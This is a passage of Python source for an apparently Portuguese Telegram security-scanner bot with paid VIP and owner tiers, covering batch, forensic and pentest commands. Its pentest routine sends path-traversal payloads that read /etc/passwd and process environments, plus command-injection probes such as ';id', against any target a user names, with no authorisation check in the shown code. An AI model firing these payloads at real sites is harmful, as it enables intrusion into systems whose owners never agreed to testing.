    handle_headers(chat_id, user_id, '', '', '', [target])


def _run_headers_owner(chat_id, user_id, target):
    """Run headers scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'headers', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER HEADERS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_headers(chat_id, user_id, '', '', '', [target])


def _run_cors_normal(chat_id, user_id, target):
    """Run cors scanner in normal mode"""
    log_command(user_id, '', 'cors', '', target)
    handle_cors(chat_id, user_id, '', '', '', [target])


def _run_cors_vip(chat_id, user_id, target):
    """Run cors scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'cors', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP CORS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_cors(chat_id, user_id, '', '', '', [target])


def _run_cors_owner(chat_id, user_id, target):
    """Run cors scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'cors', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER CORS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_cors(chat_id, user_id, '', '', '', [target])


def _run_robots_normal(chat_id, user_id, target):
    """Run robots scanner in normal mode"""
    log_command(user_id, '', 'robots', '', target)
    handle_robots(chat_id, user_id, '', '', '', [target])


def _run_robots_vip(chat_id, user_id, target):
    """Run robots scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'robots', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP ROBOTS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_robots(chat_id, user_id, '', '', '', [target])


def _run_robots_owner(chat_id, user_id, target):
    """Run robots scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'robots', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER ROBOTS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_robots(chat_id, user_id, '', '', '', [target])


def _run_sitemap_normal(chat_id, user_id, target):
    """Run sitemap scanner in normal mode"""
    log_command(user_id, '', 'sitemap', '', target)
    handle_sitemap(chat_id, user_id, '', '', '', [target])


def _run_sitemap_vip(chat_id, user_id, target):
    """Run sitemap scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'sitemap', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP SITEMAP</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_sitemap(chat_id, user_id, '', '', '', [target])


def _run_sitemap_owner(chat_id, user_id, target):
    """Run sitemap scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'sitemap', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER SITEMAP</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_sitemap(chat_id, user_id, '', '', '', [target])
def _run_info_normal(chat_id, user_id, target):
    """Run info scanner in normal mode"""
    log_command(user_id, '', 'info', '', target)
    handle_info(chat_id, user_id, '', '', '', [target])
def _run_info_vip(chat_id, user_id, target):
    """Run info scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'info', '', target)
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP INFO</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_info(chat_id, user_id, '', '', '', [target])
def _run_info_owner(chat_id, user_id, target):
    """Run info scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'info', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER INFO</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_info(chat_id, user_id, '', '', '', [target])
def _run_exposed_normal(chat_id, user_id, target):
    """Run exposed scanner in normal mode"""
    log_command(user_id, '', 'exposed', '', target)
    handle_exposed(chat_id, user_id, '', '', '', [target])


def _run_exposed_vip(chat_id, user_id, target):
    """Run exposed scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'exposed', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP EXPOSED</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_exposed(chat_id, user_id, '', '', '', [target])


def _run_exposed_owner(chat_id, user_id, target):
    """Run exposed scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'exposed', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER EXPOSED</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_exposed(chat_id, user_id, '', '', '', [target])


def _run_backup_normal(chat_id, user_id, target):
    """Run backup scanner in normal mode"""
    log_command(user_id, '', 'backup', '', target)
    handle_backup(chat_id, user_id, '', '', '', [target])


def _run_backup_vip(chat_id, user_id, target):
    """Run backup scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'backup', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP BACKUP</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_backup(chat_id, user_id, '', '', '', [target])


def _run_backup_owner(chat_id, user_id, target):
    """Run backup scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'backup', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER BACKUP</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_backup(chat_id, user_id, '', '', '', [target])


def _run_api_normal(chat_id, user_id, target):
    """Run api scanner in normal mode"""
    log_command(user_id, '', 'api', '', target)
    handle_api(chat_id, user_id, '', '', '', [target])


def _run_api_vip(chat_id, user_id, target):
    """Run api scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'api', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP API</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_api(chat_id, user_id, '', '', '', [target])


def _run_api_owner(chat_id, user_id, target):
    """Run api scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'api', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER API</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_api(chat_id, user_id, '', '', '', [target])


def _run_shell_normal(chat_id, user_id, target):
    """Run shell scanner in normal mode"""
    log_command(user_id, '', 'shell', '', target)
    handle_shell(chat_id, user_id, '', '', '', [target])


def _run_shell_vip(chat_id, user_id, target):
    """Run shell scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'shell', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP SHELL</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_shell(chat_id, user_id, '', '', '', [target])


def _run_shell_owner(chat_id, user_id, target):
    """Run shell scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'shell', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER SHELL</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_shell(chat_id, user_id, '', '', '', [target])


def _run_config_normal(chat_id, user_id, target):
    """Run config scanner in normal mode"""
    log_command(user_id, '', 'config', '', target)
    handle_config(chat_id, user_id, '', '', '', [target])


def _run_config_vip(chat_id, user_id, target):
    """Run config scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'config', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP CONFIG</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_config(chat_id, user_id, '', '', '', [target])


def _run_config_owner(chat_id, user_id, target):
    """Run config scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'config', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER CONFIG</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_config(chat_id, user_id, '', '', '', [target])


def _run_http_normal(chat_id, user_id, target):
    """Run http scanner in normal mode"""
    log_command(user_id, '', 'http', '', target)
    handle_http(chat_id, user_id, '', '', '', [target])


def _run_http_vip(chat_id, user_id, target):
    """Run http scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'http', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP HTTP</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_http(chat_id, user_id, '', '', '', [target])


def _run_http_owner(chat_id, user_id, target):
    """Run http scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'http', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER HTTP</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_http(chat_id, user_id, '', '', '', [target])


def _run_sslchain_normal(chat_id, user_id, target):
    """Run sslchain scanner in normal mode"""
    log_command(user_id, '', 'sslchain', '', target)
    handle_sslchain(chat_id, user_id, '', '', '', [target])


def _run_sslchain_vip(chat_id, user_id, target):
    """Run sslchain scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'sslchain', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP SSLCHAIN</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_sslchain(chat_id, user_id, '', '', '', [target])


def _run_sslchain_owner(chat_id, user_id, target):
    """Run sslchain scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'sslchain', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER SSLCHAIN</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_sslchain(chat_id, user_id, '', '', '', [target])


def _run_ssl_normal(chat_id, user_id, target):
    """Run ssl scanner in normal mode"""
    log_command(user_id, '', 'ssl', '', target)
    handle_ssl(chat_id, user_id, '', '', '', [target])


def _run_ssl_vip(chat_id, user_id, target):
    """Run ssl scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'ssl', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP SSL</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_ssl(chat_id, user_id, '', '', '', [target])


def _run_ssl_owner(chat_id, user_id, target):
    """Run ssl scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'ssl', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER SSL</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_ssl(chat_id, user_id, '', '', '', [target])

def handle_quick(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Quick Scan — info + headers + rate in one shot (file output)"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /quick &lt;url&gt;\nExemplo: /quick google.com")
        return
    target = args[0]
    log_command(user_id, username, "quick", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"⚡ <b>Quick Scan</b> em {escape_html(clean_target)}...")

    # Gather all results
    info_r = tool_website_info(target)
    headers_r = tool_headers_analysis(target)

    # Strip HTML for file output
    def _clean(r):
        return re.sub(r'<[^>]+>', '', r)

    report = f"MTH Security — Quick Scan\n"
    report += f"Target: {clean_target}\n"
    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    report += "=" * 60 + "\n\n"
    report += "--- INFO ---\n" + _clean(info_r) + "\n\n"
    report += "--- HEADERS ---\n" + _clean(headers_r) + "\n"

    success = send_document(chat_id, report, f"quick_scan_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"📄 <b>Quick Scan finalizado!</b>\nTarget: {escape_html(clean_target)}")
    else:
        send_msg(user_id, chat_id, f"✅ <b>Quick Scan finalizado</b> em {escape_html(clean_target)}")

def handle_cancel(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Cancel any running scan for the user"""
    log_user(user_id, username, first_name, last_name)
    if user_id in STOP_EVENTS:
        STOP_EVENTS[user_id].set()
        send_msg(user_id, chat_id, "🛑 <b>Scan cancelado!</b> Processos interrompidos.")
    else:
        send_msg(user_id, chat_id, "ℹ️ <b>Nenhum scan em andamento.</b>")

def handle_batch(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Batch scan multiple URLs with the same command
    Usage: /batch sqli url1 url2 url3
    """
    log_user(user_id, username, first_name, last_name)
    if len(args) < 2:
        send_msg(user_id, chat_id, "❌ Use: /batch &lt;comando&gt; &lt;url1&gt; &lt;url2&gt; ...\nExemplo: /batch sqli site1.com site2.com site3.com")
        return
    scan_cmd = args[0]
    targets = args[1:]
    log_command(user_id, username, "batch", f"{scan_cmd} x{len(targets)} targets")
    send_msg(user_id, chat_id, f"🔍 <b>Batch Scan</b> — {len(targets)} targets com /{scan_cmd}...\n⚠️ Use /cancel para parar.")
    # V5.1: Create stop event so /cancel works
    STOP_EVENTS[user_id] = threading.Event()
    tool_map = {
        'info': tool_website_info, 'sqli': tool_sqli, 'xss': tool_xss_scanner,
        'admin': tool_admin_finder, 'ports': tool_port_scanner,
        'dirs': tool_directory_scanner, 'sub': tool_subdomain_scanner,
        'wp': tool_wordpress_scanner, 'dns': tool_dns_tools,
        'cms': tool_cms_detector, 'ssl': tool_ssl_audit,
        'headers': tool_headers_analysis, 'exposed': tool_exposed_files,
        'backup': tool_backup_finder, 'api': tool_api_discovery,
        'shell': tool_webshell_hunter, 'config': tool_config_scanner,
        'reverse': tool_reverse_ip, 'ftpssh': tool_ftp_ssh,
        'emails': tool_email_scraper, 'robots': tool_robots_txt,
        'sitemap': tool_sitemap, 'tech': tool_tech_detect,
        'cors': tool_cors_test,
    }
    tool_fn = tool_map.get(scan_cmd)
    if not tool_fn:
        lang = get_user_lang(user_id)
        if lang == 'en':
            send_msg(user_id, chat_id, f"❌ Command /{scan_cmd} not supported in batch mode.")
        elif lang == 'es':
            send_msg(user_id, chat_id, f"❌ Comando /{scan_cmd} no soportado en modo batch.")
        else:
            send_msg(user_id, chat_id, f"❌ Comando /{scan_cmd} não suportado em batch.")
        return
    # Send initial progress message and edit it for each target
    progress_msg_id = send_progress(chat_id, 'batch', 0, len(targets), f"Batch /{scan_cmd} — {len(targets)} targets")
    for i, t in enumerate(targets, 1):
        if user_id in STOP_EVENTS and STOP_EVENTS[user_id].is_set():
            break
        ct = extract_hostname(t)
        edit_progress(progress_msg_id, chat_id, i, len(targets), f"Batch /{scan_cmd} — [{i}/{len(targets)}] {ct}")
        try:
            r = tool_fn(t)
            # Truncate long results for batch
            if len(r) > 3000:
                r = r[:3000] + "\n... <i>(truncado)</i>"
            send_msg(user_id, chat_id, r)
        except Exception as e:
            send_msg(user_id, chat_id, f"❌ Erro em {escape_html(ct)}: {escape_html(str(e)[:100])}")
    finish_progress(progress_msg_id, chat_id, f"✅ Batch Scan finalizado! {len(targets)} targets processados.")
    send_msg(user_id, chat_id, f"✅ <b>Batch Scan finalizado!</b> {len(targets)} targets processados.")

    # Cleanup stop event
    if user_id in STOP_EVENTS:
        del STOP_EVENTS[user_id]

# ═══════════════════════════════════════════════════════════════
#  OWNER-EXCLUSIVE COMMANDS
# ═══════════════════════════════════════════════════════════════

def handle_forensic(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Digital Forensic Analysis — deep site investigation"""
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "🔒 <b>Acesso negado!</b> Este comando é exclusivo dos donos.")
        return
    if not args:
        # Called from menu — ask for target
        PENDING_TARGETS[user_id] = {'cmd': 'forensic', 'tier': 'owner'}
        buttons = [[{"text": "❌ Cancelar", "callback_data": "menu:cancel_target"}]]
        send_message_with_buttons(chat_id,
            "🔬 <b>Insira o alvo</b> (👑 OWNER)\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Ferramenta: <b>Forensic Analysis</b>\n\n"
            "Envie a URL, domínio ou IP do alvo.\n"
            "<i>Exemplo: example.com, https://site.com, 192.168.1.1</i>\n\n"
            "Para cancelar, pressione o botão abaixo.",
            buttons)
        return
    target = args[0]
    log_command(user_id, username, "forensic", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔬 <b>OWNER Forensic Analysis</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n💀 Análise forense completa: SSL chain, WHOIS, exposed files, webshells, config, API, tech, subdomains...")

    def _clean(text):
        return re.sub(r'<[^>]+>', '', text)

    url = clean_target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    def _get_whois_text(domain):
        """Inline WHOIS lookup (same logic as handle_whois but returns plain text)"""
        text = ""
        try:
            resp = _safe_get(f"https://api.allorigins.win/raw?url=https://www.whois.com/whois/{domain}", timeout=10)
            if resp and resp.status_code == 200:
                whois_data = resp.text
                fields = {
                    'Registrar': ['Registrar:', 'Registrar Name:'],
                    'Creation Date': ['Creation Date:', 'Creation date:'],
                    'Expiry Date': ['Registry Expiry Date:', 'Expiry Date:', 'Expiration Date:'],
                    'Status': ['Domain Status:', 'Status:'],
                    'Name Server': ['Name Server:', 'Nserver:'],
                    'DNSSEC': ['DNSSEC:', 'DNSSEC:'],
                }
                for label, keys in fields.items():
                    for key in keys:
                        idx = whois_data.find(key)
                        if idx != -1:
                            val = whois_data[idx + len(key):].split('\n')[0].strip()
                            if val and len(val) < 200:
                                text += f"{label}: {val}\n"
                                break
            else:
                resp2 = _safe_get(f"http://ip-api.com/json/{domain}?fields=query,status,country,isp,org,as", timeout=5)
                if resp2 and resp2.status_code == 200:
                    data = resp2.json()
                    if data.get('status') == 'success':
                        text += f"IP: {data.get('query', 'N/D')}\n"
                        text += f"ISP: {data.get('isp', 'N/D')}\n"
                        text += f"Org: {data.get('org', 'N/D')}\n"
                        text += f"ASN: {data.get('as', 'N/D')}\n"
        except Exception as e:
            text += f"Error: {str(e)}\n"
        return text if text.strip() else "No WHOIS data available."

    sections = []
    sections.append("═" * 60)
    sections.append("  🔬 DIGITAL FORENSIC ANALYSIS — OWNER MODE")
    sections.append(f"  Target: {clean_target}")
    sections.append(f"  Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    sections.append("═" * 60)

    # 1. SSL/TLS Chain
    send_msg(user_id, chat_id, "📋 <b>1/10 — SSL Chain Analysis...</b>")
    sections.append("\n1/10 — SSL/TLS CHAIN\n" + "-" * 40)
    sections.append(_clean(tool_ssl_audit(url)))

    # 2. WHOIS
    send_msg(user_id, chat_id, "📋 <b>2/10 — WHOIS Investigation...</b>")
    sections.append("\n2/10 — WHOIS INVESTIGATION\n" + "-" * 40)
    sections.append(_clean(_get_whois_text(clean_target)))

    # 3. Exposed Files
    send_msg(user_id, chat_id, "📋 <b>3/10 — Exposed Files...</b>")
    sections.append("\n3/10 — EXPOSED FILES\n" + "-" * 40)
    sections.append(_clean(tool_exposed_files(url)))

    # 4. Webshells
    send_msg(user_id, chat_id, "📋 <b>4/10 — Webshell Hunter...</b>")
    sections.append("\n4/10 — WEBSHELL HUNTER\n" + "-" * 40)
    sections.append(_clean(tool_webshell_hunter(url)))

    # 5. Config Files
    send_msg(user_id, chat_id, "📋 <b>5/10 — Config Exposure...</b>")
    sections.append("\n5/10 — CONFIG EXPOSURE\n" + "-" * 40)
    sections.append(_clean(tool_config_scanner(url)))

    # 6. API Discovery
    send_msg(user_id, chat_id, "📋 <b>6/10 — API Discovery...</b>")
    sections.append("\n6/10 — API DISCOVERY\n" + "-" * 40)
    sections.append(_clean(tool_api_discovery(url)))

    # 7. Tech Detection
    send_msg(user_id, chat_id, "📋 <b>7/10 — Tech Stack...</b>")
    sections.append("\n7/10 — TECH STACK\n" + "-" * 40)
    sections.append(_clean(tool_tech_detect(url)))

    # 8. Subdomain Enum
    send_msg(user_id, chat_id, "📋 <b>8/10 — Subdomain Enumeration...</b>")
    sections.append("\n8/10 — SUBDOMAIN ENUM\n" + "-" * 40)
    sections.append(_clean(tool_subdomain_scanner(target)))

    # 9. Headers
    send_msg(user_id, chat_id, "📋 <b>9/10 — Security Headers...</b>")
    sections.append("\n9/10 — SECURITY HEADERS\n" + "-" * 40)
    sections.append(_clean(tool_headers_analysis(url)))

    # 10. DNSSEC
    send_msg(user_id, chat_id, "📋 <b>10/10 — DNSSEC & DMARC...</b>")
    sections.append("\n10/10 — DNSSEC & DMARC\n" + "-" * 40)
    sections.append(_clean(tool_dns_tools(target)))

    report = "\n".join(sections)
    success = send_document(chat_id, report, f"forensic_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"✅ <b>Forensic Analysis finalizado!</b>\nTarget: {escape_html(clean_target)}\n📄 Relatório forense enviado como arquivo .txt")
    else:
        send_msg(user_id, chat_id, f"✅ <b>Forensic Analysis finalizado!</b>\nTarget: {escape_html(clean_target)}")


def handle_pentest(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Full Pentest Automation — SQLi + XSS + LFI + RCE + CSRF"""
    log_user(user_id, username, first_name, last_name)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "🔒 <b>Acesso negado!</b> Este comando é exclusivo dos donos.")
        return
    if not args:
        # Called from menu — ask for target
        PENDING_TARGETS[user_id] = {'cmd': 'pentest', 'tier': 'owner'}
        buttons = [[{"text": "❌ Cancelar", "callback_data": "menu:cancel_target"}]]
        send_message_with_buttons(chat_id,
            "💀 <b>Insira o alvo</b> (👑 OWNER)\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Ferramenta: <b>Pentest Automation</b>\n\n"
            "Envie a URL, domínio ou IP do alvo.\n"
            "<i>Exemplo: example.com, https://site.com/?id=1</i>\n\n"
            "Para cancelar, pressione o botão abaixo.",
            buttons)
        return
    target = args[0]
    log_command(user_id, username, "pentest", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"💀 <b>OWNER Pentest Automation</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n🔥 SQLi OWNER + XSS VIP + LFI + RCE + CSRF + Path Traversal")

    url = clean_target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    def _clean(text):
        return re.sub(r'<[^>]+>', '', text)

    sections = []
    sections.append("═" * 60)
    sections.append("  💀 PENTEST AUTOMATION — OWNER MODE")
    sections.append(f"  Target: {clean_target}")
    sections.append(f"  Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    sections.append("═" * 60)

    # 1. SQLi OWNER
    send_msg(user_id, chat_id, "📋 <b>1/7 — SQLi OWNER...</b>")
    sections.append("\n1/7 — SQL INJECTION (OWNER)\n" + "-" * 40)
    sections.append(_clean(tool_sqli_owner(url)))

    # 2. XSS VIP
    send_msg(user_id, chat_id, "📋 <b>2/7 — XSS VIP...</b>")
    sections.append("\n2/7 — XSS (VIP)\n" + "-" * 40)
    sections.append(_clean(tool_xss_vip(url)))

    # 3. LFI / Path Traversal
    send_msg(user_id, chat_id, "📋 <b>3/7 — LFI / Path Traversal...</b>")
    sections.append("\n3/7 — LFI / PATH TRAVERSAL\n" + "-" * 40)
    lfi_payloads = [
        ("../../../etc/passwd", "/etc/passwd root detection"),
        ("....//....//....//etc/passwd", "Double-dot traversal"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL-encoded traversal"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper"),
        ("/etc/ssh/sshd_config", "SSH config exposure"),
        ("/proc/self/environ", "Process environment leak"),
        ("/var/log/apache2/access.log", "Apache access log"),
        ("/proc/version", "Kernel version leak"),
    ]
    for payload, desc in lfi_payloads:
        try:
            from urllib.parse import quote
            test_url = f"{url}?page={quote(payload)}" if '?' in url else f"{url}/?page={quote(payload)}"
            resp = _safe_get(test_url, timeout=10)
            if resp and resp.status_code < 400:
                # Check for LFI indicators
                indicators = ['root:', 'sshd', 'Apache', 'nginx', 'kernel', 'proc', 'bin/bash', 'nobody:', 'www-data:']
                found = [i for i in indicators if i.lower() in resp.text.lower()]
                if found:
                    sections.append(f"🔴 VULN: {desc} — Indicators: {', '.join(found[:3])}")
                else:
                    sections.append(f"⚪ Não vulnerável: {desc}")
            else:
                sections.append(f"⚪ Não vulnerável: {desc}")
        except:
            sections.append(f"❌ Erro: {desc}")

    # 4. RCE Detection
    send_msg(user_id, chat_id, "📋 <b>4/7 — RCE Detection...</b>")
    sections.append("\n4/7 — REMOTE CODE EXECUTION\n" + "-" * 40)
    rce_payloads = [
        (";id", "Command injection (semicolons)"),
        ("|id", "Pipe injection"),
        ("`id`", "Backtick injection"),
        ("$(id)", "Subshell injection"),
        ("${1337+1337}", "Expression injection"),
    ]
    for payload, desc in rce_payloads:
        try:
            from urllib.parse import quote
            test_url = f"{url}?cmd={quote(payload)}" if '?' in url else f"{url}/?cmd={quote(payload)}"
            resp = _safe_get(test_url, timeout=10)
            if resp and resp.status_code < 400:
                rce_indicators = ['uid=', 'gid=', 'groups=', 'root', 'nobody', 'www-data', 'daemon']
                found = [i for i in rce_indicators if i in resp.text.lower()]
                if found:
                    sections.append(f"🔴 VULN: {desc} — Indicators: {', '.join(found[:3])}")
                else:
                    sections.append(f"⚪ Não vulnerável: {desc}")
            else:
                sections.append(f"⚪ Não vulnerável: {desc}")
        except:
            sections.append(f"❌ Erro: {desc}")

    # 5. CSRF
    send_msg(user_id, chat_id, "📋 <b>5/7 — CSRF Check...</b>")
    sections.append("\n5/7 — CSRF PROTECTION\n" + "-" * 40)
    try:
        resp = _safe_get(url, timeout=10)
        if resp and resp.status_code < 400:
            body = resp.text.lower()
            if 'csrf' in body or 'xsrf' in body or '_token' in body or 'csrf_token' in body:
                sections.append("✅ CSRF tokens detectados na página")
            else:
                sections.append("⚠️ Nenhum token CSRF detectado na página")
            # Check security headers
            csrf_headers = resp.headers.get('X-CSRF-Token', '') or resp.headers.get('X-XSRF-Token', '')
            if csrf_headers:
                sections.append("✅ Header CSRF/XSRF presente")
            else:
                sections.append("⚠️ Nenhum header CSRF/XSRF encontrado")
        else:
            sections.append("❌ Não foi possível acessar o site")
    except Exception as e:
        sections.append(f"❌ Erro: {str(e)[:100]}")

    # 6. Admin Panel Deep
    send_msg(user_id, chat_id, "📋 <b>6/7 — Admin Panel Deep...</b>")
    sections.append("\n6/7 — ADMIN PANEL DEEP\n" + "-" * 40)
    sections.append(_clean(tool_admin_finder(url)))

    # 7. Backup/Config
    send_msg(user_id, chat_id, "📋 <b>7/7 — Backup & Config...</b>")
    sections.append("\n7/7 — BACKUP & CONFIG\n" + "-" * 40)
    sections.append(_clean(tool_backup_finder(url)))
    sections.append("\n--- CONFIG ---\n" + _clean(tool_config_scanner(url)))

    report = "\n".join(sections)
    success = send_document(chat_id, report, f"pentest_{clean_target}.txt")
    if success:
